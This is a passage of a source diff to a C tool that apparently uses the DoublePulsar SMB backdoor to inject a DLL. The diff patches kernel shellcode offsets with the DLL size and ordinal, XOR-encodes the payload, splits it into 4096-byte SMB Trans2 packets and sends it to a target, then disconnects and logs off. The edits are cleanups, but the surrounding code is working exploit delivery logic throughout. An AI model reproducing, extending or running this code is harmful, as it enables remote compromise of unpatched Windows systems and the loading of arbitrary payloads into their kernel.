@@ -425,8 +425,8 @@ int main(int argc, char* argv[])
 	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
 
 	//Update treeID, UserID
-	memcpy(trans2_request + 28, (char*)&treeid, 2);
-	memcpy(trans2_request + 32, (char*)&userid, 2);
+	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
+	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
 	//might need to update processid
 
 	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
@@ -487,24 +487,24 @@ int main(int argc, char* argv[])
 	CloseHandle(hFile);
 
 	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
+	//printf("BEFORE:  ");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 	*(DWORD*)&kernel_rundll_shellcode[2158] = dwFileSizeLow + 3978;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
+	//printf("AFTER:  ");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 
 	printf("patching DLL size...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
+	//printf("BEFORE:  ");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = dwFileSizeLow;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
+	//printf("AFTER:  ");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
 	printf("patching DLL ordinal...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
+	//printf("BEFORE:  ");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
+	//printf("AFTER:  ");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 
 	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
 	kernel_shellcode_size -= 1;
@@ -513,16 +513,16 @@ int main(int argc, char* argv[])
 	PBYTE pFULLBUFFER = new BYTE[payload_totalsize];
 
 	int numberofpackets = payload_totalsize / 4096;
-	int iterations = payload_totalsize % 4096;
+	int remainder = payload_totalsize % 4096;
 	printf("will send %d packets\n ", numberofpackets);
-	printf("%d as a remainder\n", iterations);
+	printf("%d as a remainder\n", remainder);
 
 	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
 	memcpy(pFULLBUFFER + 6144, pExeBuffer, dwFileSizeLow);
 
 	//unsigned int XorKey = 0x58581162;
-	unsigned char byte_xor_key[5];
-	byte_xor_key[0] = (unsigned char)XorKey & 0xFF;
+	unsigned char byte_xor_key[4];
+	byte_xor_key[0] = (unsigned char)XorKey;
 	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
 	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
 	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
@@ -547,7 +547,7 @@ int main(int argc, char* argv[])
 
 	unsigned short TotalDataCount = 4096;
 	unsigned short DataCount = 4096;
-	unsigned short byteCount = 4096 + 13;
+	unsigned short byteCount = 4096 + 12;
 
 	//unsigned char SMBDATA[4096];
 	//memset(SMBDATA, 0x00, 4096);
@@ -595,13 +595,13 @@ int main(int argc, char* argv[])
 			*(WORD*)(last_packet + 0x3b) = DataCount;
 			*(WORD*)(last_packet + 0x43) = byteCount;
 
-			memcpy((unsigned char*)last_packet + 0x27, (char*)&TotalDataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x3b, (char*)&DataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x43, (char*)&byteCount, 2);
+			memcpy((unsigned char*)last_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x3b, (unsigned char*)&DataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x43, (unsigned char*)&byteCount, 2);
 
 			//Update treeID, UserID
-			memcpy((unsigned char*)last_packet + 28, (char*)&treeid, 2);
-			memcpy((unsigned char*)last_packet + 32, (char*)&userid, 2);
+			memcpy((unsigned char*)last_packet + 28, (unsigned char*)&treeid, 2);
+			memcpy((unsigned char*)last_packet + 32, (unsigned char*)&userid, 2);
 
 			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 			memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
@@ -653,8 +653,8 @@ int main(int argc, char* argv[])
 		memcpy((unsigned char*)big_packet + 82, (unsigned char*)pFULLBUFFER + ctx, ChunkSize);
 
 		//Update treeID, UserID
-		memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
-		memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
+		memcpy((unsigned char*)big_packet + 28, (unsigned char*)&treeid, 2);
+		memcpy((unsigned char*)big_packet + 32, (unsigned char*)&userid, 2);
 
 		//send the payload
 		send(sock, (char*)big_packet, size_normal_packet, 0);
@@ -694,8 +694,8 @@ int main(int argc, char* argv[])
 		"\x00\x08\x41\x00\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the disconnect packet
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
@@ -708,8 +708,8 @@ int main(int argc, char* argv[])
 		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the logoff packet
 	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
